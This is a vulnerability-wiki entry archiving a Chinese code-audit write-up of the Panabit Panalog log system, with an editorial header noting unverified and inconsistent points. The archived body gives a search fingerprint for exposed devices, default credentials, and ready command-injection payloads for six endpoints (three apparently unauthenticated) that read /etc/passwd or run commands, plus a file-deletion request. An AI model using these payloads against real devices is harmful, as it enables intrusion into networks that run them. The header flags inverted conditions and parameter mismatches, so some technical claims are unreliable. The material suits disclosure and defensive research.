---
source: "MrWQ/vulnerability-paper"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "Panalog 日志系统设备审计"
product: "Panabit Panalog"
record_type: "roundup"
document_type: "多漏洞代码审计"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "文称<=MARS r10p1Free；3前台RCE、3后台RCE、1后台删除；默认凭据另项"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/Panalog%20%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E8%AE%BE%E5%A4%87%E5%AE%A1%E8%AE%A1.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://mp.weixin.qq.com/s/8FVXJGOMUSemP7al3UrceQ"
id: "vw-91575aee0046f57a75776a07"
entity_id: "ve-91575aee0046f57a75776a07"
schema_version: "1"
---

# Panalog 日志系统设备审计

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Panabit Panalog
- 文献类型：多漏洞代码审计
- 版本、权限及部署边界：文称<=MARS r10p1Free；3前台RCE、3后台RCE、1后台删除；默认凭据另项
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 七个入口和鉴权条件不同应拆实体关联，不强合并同产品RCE；源码/固件版本hash和补丁缺
2. 删除包含chksession()所有文件会破坏审计语境，且无该字符串不证明无上层/include鉴权，应静态追调用而非此筛选推出匿名
3. 前台第二项判断条件代码是触发拒绝条件，文称符合即可执行容易倒置；fetchfile示例缺nodeip，accountlist描述参数与实际errname不一致
4. PoC多为只有路径+body非完整HTTP、后台Cookie没展示；创建多个输出文件及deletefile为状态改变
5. 后台删除仅5.txt未证实任意路径；所有关键源代码与成功截图未视检；官方源码下载链接和原文可保留

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/8FVXJGOMUSemP7al3UrceQ>
- 原文参考链接（未重新核验）：<http://ksria.com/simpread/>
- 原文参考链接（未重新核验）：<https://www.panabit.com/cn/product/2021/0107/379.html****>
- 原文参考链接（未重新核验）：<https://github.com/MrWQ/vulnerability-paper>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8FVXJGOMUSemP7al3UrceQ)

0x00 前言

**Fofa:app="Panabit-Panalog"   **影响版本: <=** **MARS r10p1Free****

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5TClHMIKmicX9Y6h33gkBNibziaQvIwhGmfothBCEA3fr1VEt39dj1dLgQ/640?wx_fmt=png&from=appmsg)

**访问** **/cretime.txt 文件可查看版本.**

**开局首先找找有无官方文档, 默认账密等** **默认账密: admin|panabit**

**并且这里能下载源码:** 

****https://www.panabit.com/cn/product/2021/0107/379.html****

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5fIdVpasibuWdhHpK731nibO8JKiacLLlqEB7ibal1QicibwN4yVI2W39dySA/640?wx_fmt=png&from=appmsg)

**下载下来 发现 web 目录在 \usr\logd\www**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5ksEEOqWyv0q3aDlyicPwOuZibsECpHo0Rl5HNLKDfwh0giadibVOMMSzMg/640?wx_fmt=png&from=appmsg)

**直接开始审计 我这里用 Seay 源代码审计系统.**

**这里有很多思路 可以从****黑盒到白盒** **(即先通过现有漏洞获取源码 然后进行白盒审计.)**

**首先要挖前台的漏洞 那么需要鉴权的文件是必不可有的.** **这里使用命令删除所有包含鉴权代码的文件.**

```
rm -rf $(grep -ril 'chksession()' ./)

```

0x01 前台任意命令执行

命令执行点 1
-------

**这里定位到一处命令执行.**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5uI8MsFZ7EjSf3eLN6IXhyCEhoM678P8e0IJITck1kGRIWbxcSFDlgQ/640?wx_fmt=png&from=appmsg)  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5j5dZlSiaibxhO1fZibibA8NA6kNtCibPsFjs9mkGic6JicNE9HFEic6e0avJdg/640?wx_fmt=png&from=appmsg)

**发现其通过** **Username** **参数传递进去 利用 Exec 执行命令 未做过滤 但是命令没有回显.**

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5RRPuI5ibhc82ZPpApsMLtHffvL3xibHfzvwasooRNUzAkuGdFvSNeoLA/640?wx_fmt=png&from=appmsg)**

**Payload:  
**

```
POST /account/sy_query.php
username=|cat /etc/passwd >1.txt

```

命令执行点 2  

**定位到第二处前台命令执行.**

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5QLg26AZ31O17zqpykvVibdyXoFBdmlORLhxMicmWQicpjNKLoa8FU19CQ/640?wx_fmt=png&from=appmsg)**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5kndpib6rNicaf4iaSuApQ6YIicicy6XMgcAVKbXZjr1CrCFAeiaOibDsN0tGg/640?wx_fmt=png&from=appmsg)  

**这里传递了三个参数（Get 传入或 Post 传入都是可以的）：Token id host**

**只需要符合下列条件即可触发命令执行.**

```
if (empty($token) || $id < 0 || $id == "") {
  outputres("no", "ERROR: INVALID_PARAM");
  exit;
}

```

**Payload:**

```
POST /content-apply/libres_syn_delete.php
token=1&id=2&host=|cat /etc/passwd >222.txt

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5fgiccvbNhYgfw1Y6GqIl4yQ8LNwkrHVGvgOhF6gD1OIjvf9R2pQ6goQ/640?wx_fmt=png&from=appmsg)

命令执行点 3

**又定位到一处命令执行.**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5kvCtyKgCDHGk4LvDawIhEbq34HbCe5ROXhBtYkdJACABuQ05DWsGLw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5Lot9Dic7wwgFyX2aYODWvALgNkyBmWfKQ6tZplRKT4CpbMEn9aOMiagQ/640?wx_fmt=png&from=appmsg)

**这里 grpid 参数通过 postval 函数 (上边 Include 包含了 / common.php 文件 中有定义) 传入 然后带入命令执行.**

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd55gyQ4ROLR65sRrVhVDPR4woUibPCRZHaYT8uFkGG8znR2iatZm662Xxg/640?wx_fmt=png&from=appmsg)**

**直接构造请求：**  

```
POST /sessiptbl.php
action=serverdelay&grpid=|id >333.txt

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5ZTKm7TiaicudIJvSX7V9g0I5gqXJgfnLPWNDWD2R8ia8KN0KWwiaXxp4yQ/640?wx_fmt=png&from=appmsg)

0x02 后台任意命令执行

执行点 1
-----

**/ajax_ping.php** **这里 post 传递了 ipaddr 函数 带入 exec 命令执行.**
----------------------------------------------------------

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5HEox6GiblYDkV9aB8pCgSdhIb9ic2GFIaxYBxLCVAwdX7a0Oviav4RwcQ/640?wx_fmt=png&from=appmsg)**

**Payload:  
**

```
POST /ajax_ping.php HTTP/1.1
ipaddr=|id >2.txt

```

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5BM8NicAp4ice6Mn4uzB0LjTPUzznxpEKaNzzV4BVVIW3icGREKTn4G4OQ/640?wx_fmt=png&from=appmsg)**

执行点 2

**/fetchfile.php** **post 传递了 filename,nodeip,type 参数可控，带入 exec 造成命令执行**

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd56Ke7emVvnx44JQerAnYbiakCMl6QRQmibdjRJWQ5vbU49iaCeUltsx91g/640?wx_fmt=png&from=appmsg)**

**Payload:**  

```
POST /fetchfile.php HTTP/1.1
type=downloadfile&filename=|id >5.txt

```

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5hf9I87A3LvIfRQMZoRibaPJ8rEvthpn7moaaia4LG3DMFxfQTJVPBLGQ/640?wx_fmt=png&from=appmsg)**

执行点 3  

**/account/accountlist.php** **可以传递 account,startdt,enddt.**

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5q4xZ66wa8hRmWeu3kWlneY3AianlpiaK4TeSx0ZAAO7ID0vBVNImy99g/640?wx_fmt=png&from=appmsg)**

**Payload:  
**

```
POST /account/accountlist.php HTTP/1.1
type=acctoapp&account=123&errname=|ps >9.txt

```

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5fLf2VZibVLUZsRouAqnlDUpvkibvH6lC0jYbLLlQQsoWQcdA8bXvV9iaQ/640?wx_fmt=png&from=appmsg)**

0x03 后台任意文件删除  

**定位到一处删除文件操作. /deletefile.php**

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5NgPD6f5zODkOJkqMko8Giajxn8fZ9yamlGIsjvgoausUCCsiau853fbg/640?wx_fmt=png&from=appmsg)**

**Payload:  
**

```
POST /deletefile.php HTTP/1.1
filename=5.txt

```

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6q5rHibYRXpQIwRyDvXWd5iczIBV3gwFwLPiaeQyvp5QgIB2TZpwPSwoUG7dnGxWql5CvO5RicuK9GQ/640?wx_fmt=png&from=appmsg)**

**免责声明：****文章中涉及的程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！！**
======================================================================================================

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
